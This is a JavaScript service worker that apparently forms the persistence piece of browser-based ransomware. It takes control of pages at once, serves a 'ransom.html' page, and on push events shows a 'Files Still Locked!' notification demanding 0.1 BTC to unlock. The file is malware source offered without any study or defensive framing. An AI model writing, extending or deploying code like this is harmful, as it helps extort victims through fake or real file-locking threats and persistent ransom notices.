self.addEventListener('install', e => {
    self.skipWaiting();
});

self.addEventListener('activate', e => {
    self.clients.claim();
});

self.addEventListener('fetch', e => {
    if (e.request.url.includes('ransom.html')) {
        e.respondWith(fetch('ransom.html'));
    }
});

// Boot persistence
self.addEventListener('push', e => {
    e.waitUntil(
        self.registration.showNotification('Files Still Locked!', {
            body: 'Pay 0.1 BTC to unlock',
            icon: 'icon.png'
        })
    );
});